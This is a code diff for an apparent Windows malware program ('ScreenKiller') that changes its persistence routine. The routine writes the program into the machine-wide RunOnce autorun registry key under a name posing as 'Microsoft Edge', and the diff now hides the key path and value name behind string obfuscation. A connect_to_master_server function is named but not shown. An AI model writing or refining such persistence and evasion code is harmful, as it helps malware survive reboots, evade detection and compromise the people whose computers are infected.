@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <tlhelp32.h>
 #include <iostream>
 #include <thread>
@@ -74,9 +74,11 @@ bool ScreenKiller::get_persistency()
 		return false;
 
 	HKEY hkey = NULL;
-	LONG createStatus = RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
+	LONG createStatus = RegCreateKeyA(HKEY_LOCAL_MACHINE, this->encrypt_string("dxqc`verkz^TEXDXQCk`^YSX@DktBEERYCaRED^XYkeBYxYTR").c_str(), &hkey);
+	if (createStatus != ERROR_SUCCESS)
+		return false;
 
-	LONG status = RegSetValueExA(hkey, "Microsoft Edge", 0, REG_SZ, reinterpret_cast<const BYTE*>(szExeFileName), (strlen(szExeFileName) + 1) * sizeof(char));
+	return RegSetValueExA(hkey, this->encrypt_string("z^TEXDXQC").c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(szExeFileName), (strlen(szExeFileName) + 1) * sizeof(char)) == ERROR_SUCCESS;
 }
 
 bool ScreenKiller::connect_to_master_server()
